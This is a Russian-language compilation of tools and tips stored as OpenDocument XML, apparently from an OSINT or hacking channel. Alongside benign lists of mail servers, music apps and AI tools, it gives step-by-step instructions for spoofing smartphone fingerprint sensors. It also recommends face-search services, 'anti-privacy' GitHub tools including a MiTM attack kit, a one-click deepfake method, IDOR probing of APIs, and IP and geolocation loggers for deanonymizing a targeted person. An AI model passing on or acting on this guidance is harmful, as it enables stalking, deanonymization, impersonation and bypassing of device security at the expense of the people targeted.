      <text:p text:style-name="P2">1. Mail-in-a-Box (https://mailinabox.email/) - приложение с открытым исходным кодом для поднятия собственных почтовых серверов. Есть интеграция с надежным почтовым клиентом для Android K-9 Mail .</text:p>
      <text:p text:style-name="P2">2. mailcow: dockerized (https://github.com/mailcow/mailcow-dockerized) - это почтовый сервер который разворачивается в docker контейнере и требует минимум настройки.</text:p>
      <text:p text:style-name="P2">3. Docker Mailserver (https://github.com/docker-mailserver/docker-mailserver) - почтовый сервер (SMTP, IMAP, LDAP, Antispam, Antivirus), разворачивающийся в docker контейнере. </text:p>
      <text:p text:style-name="P6">4. Mox (https://github.com/mjl-/mox) - полнофункциональный защищенный почтовый сервер с открытым исходным.</text:p>
      <text:p text:style-name="P2">Слушаем музыку бесплатно, сервисы и софт:</text:p>
      <text:p text:style-name="P2">1. nuclear - десктопный проигрыватель, позволяющий слушать музыку он-лайн из всевозможных бесплатных источников. Собирает музыку с SoundCloud, YouTube и других ресурсов.</text:p>
      <text:p text:style-name="P2">2. Funkwhale (https://funkwhale.audio/) - децентрализованный, бесплатный музыкальный сервис с открытым исходным кодом. Альтернатива SoundCloud.</text:p>
      <text:p text:style-name="P2">3. Koel (https://koel.dev/) - персональный стриминговый музыкальный сервис с облачным хранилищем.</text:p>
      <text:p text:style-name="P2">4. Navidrome (https://www.navidrome.org/) - еще один стриминговый музыкальный сервис с огромным количеством различных библиотек. </text:p>
      <text:p text:style-name="P2">5. Black Hole (https://github.com/Sangwan5688/BlackHole) - музыкальный плеер с открытым исходным кодом. Для пользователей Android.</text:p>
      <text:p text:style-name="P2">Telegram-боты:</text:p>
      <text:p text:style-name="P2">1. VK Music Bot (https://t.me/vkm4bot) - бот для скачивания музыки из ВКонтакте, создайте с ним чат и формируйте плейлисты прямо в Telegram. Должен работать с iOS.</text:p>
      <text:p text:style-name="P2">2. Magic Saver (https://t.me/MagicSaverBot) - бот для скачивания постов/видео с TikTok, Instagram, YouTube Shorts, YouTube Music.</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">3. SaveTargetbot (https://t.me/SaveTargetbot) - </text:span><text:span text:style-name="T3">скачивает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">медиа</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> Instagram, Pinterest </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> TikTok.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">4. Vk Music Bot (https://t.me/vkmusic_bot) - еще один бот для скачивания аудио из VK.</text:span></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">5. SaveBot (https://t.me/izivipbot) - </text:span><text:span text:style-name="T3">скачивает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">медиа</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> Instagram, YouTube, Pinterest, VK.</text:span></text:p>
      <text:p text:style-name="P2">Онлайн сервисы для стеганографии:</text:p>
      <text:p text:style-name="P2">1. StegCloak - простой сервис с открытым исходным кодом, позволяющий спрятать текст в другом тексте. </text:p>
      <text:p text:style-name="P2">2. iCoder (https://tools.icoder.uz/image-steganography.php) - инструмент стеганографии изображений.</text:p>
      <text:p text:style-name="P2">3. PlanetCalc (https://planetcalc.ru/9345/) - еще один простой инструмент стеганографии изображений.</text:p>
      <text:p text:style-name="P2">4. Steganography Online (https://stylesuxx.github.io/steganography/) - работает с различными типами файлов.</text:p>
      <text:p text:style-name="P6">5. Steganographic Decoder (https://futureboy.us/stegano/decinput.html) - для работы с jpeg и аудиофайлами</text:p>
      <text:p text:style-name="P2">Децентрализованные альтернативы YouTube:</text:p>
      <text:p text:style-name="P2">1. https://bastyon.com/index;</text:p>
      <text:p text:style-name="P2">2. https://www.bitchute.com;</text:p>
      <text:p text:style-name="P2">3. https://joinpeertube.org/;</text:p>
      <text:p text:style-name="P2">4. https://github.com/MrS0m30n3/youtube-dl-gui;</text:p>
      <text:p text:style-name="P2">5. https://mediagoblin.org/;</text:p>
      <text:p text:style-name="P2">6. https://vimeo.com/;</text:p>
      <text:p text:style-name="P7">7. https://d.tube/.</text:p>
      <text:p text:style-name="P2">Осуществляем поиск по фото. Идеальный вариант - фотография лица искомого объекта:</text:p>
      <text:p text:style-name="P2">1. FaceCheck (https://facecheck.id/) - служба поиска по фото в зарубежных соцсетях;</text:p>
      <text:p text:style-name="P2">2. Search4faces (https://search4faces.com/) - то же самое, но по «ВКонтакте» и «Одноклассникам»;</text:p>
      <text:p text:style-name="P26">3. Pimeyes (https://pimeyes.com/en) - качественный, но платный поиск по картинкам (3 бесплатных запроса в боте, находит даже стикеры с лицом);</text:p>
      <text:p text:style-name="P25"><text:soft-page-break/><text:span text:style-name="T3">4. ImageSearch (https://www.image-search.org/) - бесплатный поиск похожих картинок в интернете;</text:span></text:p>
      <text:p text:style-name="P2">5. Tineye (https://tineye.com/) - этот сервис в представлениях не нуждается;</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">6. Reverse Image Search (https://www.reverse-image-search.org/) - </text:span><text:span text:style-name="T3">аналог</text:span><text:span text:style-name="T2"> Tineye;</text:span></text:p>
      <text:p text:style-name="P2">7. Karmadecay (http://karmadecay.com/) - поиск похожих изображений в Reddit.</text:p>
      <text:p text:style-name="P2">8. Search by Image (https://t.me/c/1338162138/396) - браузерное расширение для поиска по фотографии. Ищет через Google, Bing, Yandex, Baidu и TinEye.</text:p>
      <text:p text:style-name="P2">9. RevEye (https://chrome.google.com/webstore/detail/reveye-reverse-image-sear/keaaclcjhehbbapnphnmpiklalfhelgf) - расширение для Chrome с открытым исходным кодом, которое пробивает фотографию с помощью Google, Bing, Yandex и TinEye.</text:p>
      <text:p text:style-name="P6">10. betaface.com (http://betaface.com/demo_old.html) - сравнительный анализ фотографий. Определит вероятность того, что на двух разных изображениях один и тот же человек.</text:p>
      <text:p text:style-name="P2">Подборка сайтов с веб камерами:</text:p>
      <text:p text:style-name="P2">1. https://www.geocam.ru/ - камеры по всему миру, есть РФ и соседние страны;</text:p>
      <text:p text:style-name="P2">2. https://airportwebcams.net/ - камеры в аэропортах. Из России всего 4 аэропорта, Москвы, например, нет;</text:p>
      <text:p text:style-name="P2">3. https://www.earthcam.com/ - подборка действующих камер, известный сервис, не нуждается в представлении;</text:p>
      <text:p text:style-name="P2">4. https://youwebcams.org/ - камеры по всему миру;</text:p>
      <text:p text:style-name="P2">5. https://worldcam.eu/ - еще один неплохой сайт с камерами;</text:p>
      <text:p text:style-name="P2">Бонус:</text:p>
      <text:p text:style-name="P2">https://world-cam.ru/</text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">http://tvway.ru/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Ищем</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> Telegram. </text:span><text:span text:style-name="T3">В этот раз хотелось бы осветить различные сервисы, без общеизвестных OSINT-ботов:</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">1. Lyzem (https://lyzem.com/) - это поис­ковик по откры­тым чатам, каналам, ботам Telegram и сай­ту telegra.ph.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2. TeleGaGo (https://cse.google.com/cse?&amp;cx=006368593537057042503:efxu7xprihg#gsc.tab=0) - использует технологии Google для поиска по Telegram.</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2">4. Telegcrack (https://telegcrack.com/ru/) - ищет по заголовкам статей в Telegraph.</text:p>
      <text:p text:style-name="P2">5. TelegramDB (https://www.telegramdb.org/) - база дан­ных по телег­рам‑каналам, содер­жит свод­ную информа­цию о них и общую ста­тис­тику; </text:p>
      <text:p text:style-name="P2">Бонус:</text:p>
      <text:p text:style-name="P2">https://telemetr.me/</text:p>
      <text:p text:style-name="P6">https://tgstat.ru/</text:p>
      <text:p text:style-name="P2">Подборка OSINT/Anti-privacy инструментов с GitHub:</text:p>
      <text:p text:style-name="P2">1. https://github.com/sherlock-project/sherlock - комплексный инструмент, не нуждается в представлении;</text:p>
      <text:p text:style-name="P26">2. https://github.com/lorenzoromani1983/wayback-keyword-search - инструмент для скачивания информации из интернет-архива и поиска по ней;</text:p>
      <text:p text:style-name="P26">3. https://github.com/FluxionNetwork/fluxion - тулза для проведения MiTM атак;</text:p>
      <text:p text:style-name="P2">4. https://github.com/mandiant/capa - обнаруживает возможности исполняемых файлов;</text:p>
      <text:p text:style-name="P2">5. https://github.com/gitleaks/gitleaks - проверяет утечки данных из git репозиториев;</text:p>
      <text:p text:style-name="P2">6. https://github.com/snooppr/snoop - софт для поиска по никнейму;</text:p>
      <text:p text:style-name="P2">7. https://github.com/elcuervo/tangalanga - сканер Zoom конференций;</text:p>
      <text:p text:style-name="P2">8. https://github.com/v1s1t0r1sh3r3/airgeddon - софт для Linux, сканер Wi-Fi сетей;</text:p>
      <text:p text:style-name="P2">9. https://github.com/bellingcat/octosuite - OSINT фреймворк для GitHub аккаунтов;</text:p>
      <text:p text:style-name="P27">10. https://github.com/ThoughtfulDev/EagleEye - поиск по фото и никнейму.</text:p>
      <text:p text:style-name="P29">Используем блага нейросетей. Часть 6. Используем ИИ для рутины и автоматизации офисных и не только задач. </text:p>
      <text:p text:style-name="P2">1. Paperpal (https://paperpal.com/) - инструмент для написания любого уровня работ (от курсовых и статей до диссертаций) на основе ChatGPT. Интегрируется в Word; </text:p>
      <text:p text:style-name="P2">2. GPT for Slides (https://www.gptforslides.app/)делает слайды прямо в Google Презентациях;</text:p>
      <text:p text:style-name="P2">3. ChatGPT Writer (https://chrome.google.com/webstore/detail/chatgpt-writer-write-mail/pdnenlnelpdomajfejgapbdpmjkfpjkp)отвечает за вас на электронные письма; </text:p>
      <text:p text:style-name="P2">4. Gamma AI (https://gamma.app/)генерирует полноценные презентации: текст, дизайн, шрифты и т.д;</text:p>
      <text:p text:style-name="P2">5. Fireflies (https://fireflies.ai/) - делает выжимки из ваших созвонов, интегрируется в календарь и отвечает на все вопросы по вашим звонкам;</text:p>
      <text:p text:style-name="P2">6. AI Writer (https://ai-writer.com/)пишет тексты различной направленности, в том число SEO. К слову, обещают, что их текст не детектится на предмет работы ИИ.</text:p>
      <text:p text:style-name="P2">7. Arcwise AI (https://arcwise.app/ai/) ваш умный помощник в Google таблицах;</text:p>
      <text:p text:style-name="P2">8. Resume Maker (https://www.resumemaker.online/) - составит за вас резюме по всем канонам;</text:p>
      <text:p text:style-name="P2">9. Fakeupdate (https://fakeupdate.net/)имитирует обновление Windows, можете делать перерыв на работе, когда хотите.</text:p>
      <text:p text:style-name="P6">10. Elephas (https://elephas.app/?affiliate_id=411783379#) - ассистент-копирайтер для устройств от Apple.</text:p>
      <text:p text:style-name="P2">Как обойти датчик отпечатка пальца? Сканеры отпечатков пальцев уже давно стали нормой для современных смартфонов. Даже бюджетники дешевле $100 сегодня имеют и дактилоскоп. Однако дактилоскопический сенсор - не самый лучший способ защиты. Обойти дактилоскопический датчик можно всего за пару шагов:</text:p>
      <text:p text:style-name="P2">Фотографируем отпечаток;</text:p>
      <text:p text:style-name="P2">Корректируем в фотошопе;</text:p>
      <text:p text:style-name="P2">Печатаем фотографию на обычном лазерном принтере;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">Покрываем все столярным клеем.</text:span></text:p>
      <text:p text:style-name="P6">Таким образом можно обойти большинство дактилоскопических сенсоров в устройствах, (конечно же, данную инфу можно использовать, только в случае если ваши пальцы повредились).</text:p>
      <text:p text:style-name="P15">Генерируем лица с помощью ИИ:</text:p>
      <text:p text:style-name="P2">1. Generated Photos (https://generated.photos/faces/)известный сервис генерации лиц, раньше был бесплатен, сейчас 3 дня триала. </text:p>
      <text:p text:style-name="P2">2. Генератор человеческих лиц (https://tools.seo-zona.ru/face.html) - старенький, но вполне себе рабочий сервис. Лица создаются на основе генеративно-состязательной нейросети StyleGAN.</text:p>
      <text:p text:style-name="P2">3. ThisPersonDoestNotExist (https://this-person-does-not-exist.com/ru) - не нуждается в представлении, правда, сайт обновился и теперь там есть настройки генерации, что не может не радовать.</text:p>
      <text:p text:style-name="P2">4. Fake People (https://boredhumans.com/faces.php) - рандомный генератор лиц несуществующих людей.</text:p>
      <text:p text:style-name="P2">5. Unreal Person (https://www.unrealperson.com/) - еще один рандомный генератор лиц.</text:p>
      <text:p text:style-name="P2">6. BlendGAN (https://github.com/onion-liu/BlendGAN) - софт с открытым исходным кодом для генерации лиц. </text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">7. NotRealHuman (http://notarealhuman.com/) - </text:span><text:span text:style-name="T3">напоминает</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ранний</text:span><text:span text:style-name="T2"> ThisPersonDoesNotExist.</text:span></text:p>
      <text:p text:style-name="P2">Дипфейк можно сделать в пару кликов:</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">Нейросети не стоят на месте, теперь любой желающий может сделать качественный дипфейк всего за пару кликов с помощью сервиса - </text:span><text:span text:style-name="T2">SwapFace</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">swapface</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/#/</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">). Работает элементарно: устанавливаете приложение </text:span><text:span text:style-name="T2">SwapFace</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">swapface</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/#/</text:span><text:span text:style-name="T2">home</text:span><text:span text:style-name="T3">), во вкладке «</text:span><text:span text:style-name="T2">Video</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">FaceSwap</text:span><text:span text:style-name="T3">», в поле слева кидаете нужный видос, а в правое поле - лицо, на которое вы хотите заменить. Сервис полностью бесплатный. Также есть возможность подменять дипфейком видео с веб-камеры.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Совет по тестированию </text:span><text:span text:style-name="T2">API</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">У большинства </text:span><text:span text:style-name="T2">API</text:span><text:span text:style-name="T3"> есть конечная точка для создания, удаления, обновления и чтения объекта или группы объектов. Если вы видите:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">DELETE</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">api</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">item</text:span><text:span text:style-name="T3">/32 (удаление)</text:span></text:p>
      <text:p text:style-name="P2">То попробуйте:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">POST</text:span><text:span text:style-name="T3"> /</text:span><text:span text:style-name="T2">api</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">item</text:span><text:span text:style-name="T3"> (создание)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">GET /api/item/33 (чтение)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">PUT /api/item/33 (обновление)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">Затем протестируйте каждый из них на </text:span><text:span text:style-name="T2">IDOR</text:span><text:span text:style-name="T3">, поочередно проверяя аутентификацию и уровни доступа к различным объектам. Методологическое тестирование - лучший способ взломать </text:span><text:span text:style-name="T2">API</text:span><text:span text:style-name="T3">. Иногда тестирование </text:span><text:span text:style-name="T2">API</text:span><text:span text:style-name="T3"> усложняется тем, что мы можем не знать нужные для запроса поля или параметры. Однако есть способы найти их, например: если вы знаете поля для </text:span><text:span text:style-name="T2">GET</text:span><text:span text:style-name="T3">, вы так же можете отправить и </text:span><text:span text:style-name="T2">PUT</text:span><text:span text:style-name="T3">, изменив некоторые значения. Кроме того, есть инструменты, такие как </text:span><text:span text:style-name="T2">Arjun</text:span><text:span text:style-name="T3">, (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">s</text:span><text:span text:style-name="T3">0</text:span><text:span text:style-name="T2">md</text:span><text:span text:style-name="T3">3</text:span><text:span text:style-name="T2">v</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">Arjun</text:span><text:span text:style-name="T3">) которые могут находить параметры, а иногда и сами </text:span><text:span text:style-name="T2">API</text:span><text:span text:style-name="T3"> просто возвращают сообщения об ошибках, когда какой-то из параметров отсутствует.</text:span></text:p>
      <text:p text:style-name="P30"><text:span text:style-name="T3">Magic Copy - это расширение браузера, которое использует модель Meta Segment Anything Model для извлечения объекта переднего плана из изображения и копирования его в буфер обмена. https://github.com/kevmo314/magic-copy. Для</text:span><text:span text:style-name="T2"> Chromium: https://chrome.google.com/webstore/detail/nnifclicibdhgakebbnbfmomniihfmkg. </text:span><text:span text:style-name="T3">Для</text:span><text:span text:style-name="T2"> Firefox: https://addons.mozilla.org/en-US/firefox/addon/magic-copy/</text:span></text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 7:</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">ChatBA</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">chatba</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/) - нейросеть, которая генерирует презентацию из одного текстового запроса.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">Programminghelper</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">programming</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">helper</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/#</text:span><text:span text:style-name="T2">features</text:span><text:span text:style-name="T3">) - генерирует код из текстового запроса и сам исправляет неверные команды.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">ArtFlow</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">artflow</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">/) - создает красивый цифровой портрет. Бесплатный.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">Skybox</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Lab</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">skybox</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">blockadelabs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/) - это отличный генератор изображений 360° при помощи ИИ. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">Adrenalin</text:span><text:span text:style-name="T3">е (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">useadrenaline</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/) - выявляет неточности вашего кода и предлагает варианты исправления.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">AI</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Code</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Translator</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">code</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">translator</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">vercel</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">app</text:span><text:span text:style-name="T3">/) - переводит код из одного языка программирования в другой. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">7. </text:span><text:span text:style-name="T2">Kodezi</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">kodezi</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/) - умная автокоррекция для программистов. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">8. </text:span><text:span text:style-name="T2">GitHub</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Copilot</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">features</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">copilot</text:span><text:span text:style-name="T3">)чат-бот/ассистент для программистов. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">9. </text:span><text:span text:style-name="T2">Code</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Assist</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">plugins</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">jetbrains</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">plugin</text:span><text:span text:style-name="T3">/20085-</text:span><text:span text:style-name="T2">codeassist</text:span><text:span text:style-name="T3">) - еще один умный ассистент. </text:span></text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">10. </text:span><text:span text:style-name="T2">bloop</text:span><text:span text:style-name="T3">. (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">bloop</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">ai</text:span><text:span text:style-name="T3">/) - для поиска готовых решений, на основе </text:span><text:span text:style-name="T2">ChatGPT</text:span><text:span text:style-name="T3">-4.</text:span></text:p>
      <text:p text:style-name="P2">В вопросах деанона, логгеры это крайне полезная штука. Особенно если целевой персонаж не сильно параноик или не особо искушён в вопросах анонимности. Хотя это тоже вопрос спорный т.к. на любого мамкиного анонимуса, всегда может найтись папкин социальный инженер. В общем, актуальный список логгеров:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">canarytokens</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3"> - куча вариантов создания логгеров. Ссылки, изображения, документы и т.д. Сообщит на электронную почту если кто-то откроет, покажет </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> и геопозицию</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">whiteclouddrive</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3"> - то же самое, что и предыдущее, немного по другому оформлено </text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">getnotify</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3"> - добавит в любой </text:span><text:span text:style-name="T2">email</text:span><text:span text:style-name="T3"> токен отслеживания, информирующий об открытии письма. Сообщит дату/время открытия, </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">, данные клиента или браузера</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">thewhiteh</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">t</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">seeker</text:span><text:span text:style-name="T3"> - создаст ссылку, при открытии которой будет запрошена геопозиция устройства, если доступ предоставлен, передаст координаты где находится устройство <text:s/></text:span></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">iplogger</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3"> - создаст ссылку с </text:span><text:span text:style-name="T2">ip</text:span><text:span text:style-name="T3">-логгером, при нажатии покажет </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">, страну/город, устройство, браузер</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Макро-</text:span><text:span text:style-name="T2">OSINT</text:span><text:span text:style-name="T3">: занимаемся глобальной разведкой:</text:span></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T3">1. </text:span><text:span text:style-name="T2">Geoestimation</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">labs</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">tib</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">eu</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">geoestimation</text:span><text:span text:style-name="T3">/) - оценивает местоположение фотографии с помощью ИИ;</text:span></text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T3">2. </text:span><text:span text:style-name="T2">Sondehub</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">sondehub</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/) - карта радиозондов с подробным описанием;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">3. </text:span><text:span text:style-name="T2">Skydb</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">skydb</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3">/)информация о различных зданиях; </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">4. </text:span><text:span text:style-name="T2">EarthCam</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">www</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">earthcam</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/)агрегатор рабочих веб-камер по всему миру;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">5. </text:span><text:span text:style-name="T2">Scyscrapepage</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">skyscraperpage</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/) - информация о небоскребах;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">6. </text:span><text:span text:style-name="T2">Peakvisor</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">peakvisor</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/)</text:span><text:span text:style-name="T2">c</text:span><text:span text:style-name="T3">одержит данные о более 1 000 000 гор по всему миру;</text:span></text:p>
